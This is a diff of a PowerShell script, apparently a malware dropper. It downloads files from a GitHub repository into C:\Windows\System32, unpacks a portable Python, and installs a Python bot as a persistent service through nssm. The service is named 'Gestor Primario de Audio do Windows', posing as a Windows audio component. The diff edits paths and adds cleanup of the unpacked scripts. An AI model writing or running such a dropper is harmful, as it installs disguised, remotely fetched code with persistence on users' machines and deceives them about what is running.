@@ -2,7 +2,7 @@ $destino = 'C:\Windows\System32\ap32\nssm.exe'
 $destino2 = 'C:\Windows\System32\ap32\bot.py'
 $destino3 = 'C:\Windows\System32\re-as\WPy64.zip'
 $destino4 = 'C:\Windows\System32\re-as\WPy64_2.zip'
-$destino5 = 'C:\Windows\System32\ap32\Res-PE\scripts.zip'
+$destino5 = 'C:\Windows\System32\ap32\scripts.zip'
 
 New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
 New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
@@ -16,13 +16,14 @@ Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/m
 
 Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\re-as" -Force
 Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\re-as" -Force
-Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32\Res-PE" -Force
+Expand-Archive -Path $destino5 -DestinationPath "C:\Windows\System32\ap32" -Force
 
-Copy-Item -Path "C:\Windows\System32\ap32\Res-PE\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force
+Copy-Item -Path "C:\Windows\System32\ap32\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force
 
 Remove-Item "C:\Windows\System32\re-as\WPy64.zip" -Force
 Remove-Item "C:\Windows\System32\re-as\WPy64_2.zip" -Force
-Remove-Item "C:\Windows\System32\ap32\Res-PE\scripts.zip" -Force
+Remove-Item "C:\Windows\System32\ap32\scripts.zip" -Force
+Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force
 
 C:\Windows\System32\ap32\nssm.exe install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe C:\Windows\System32\ap32\bot.py"
 C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"
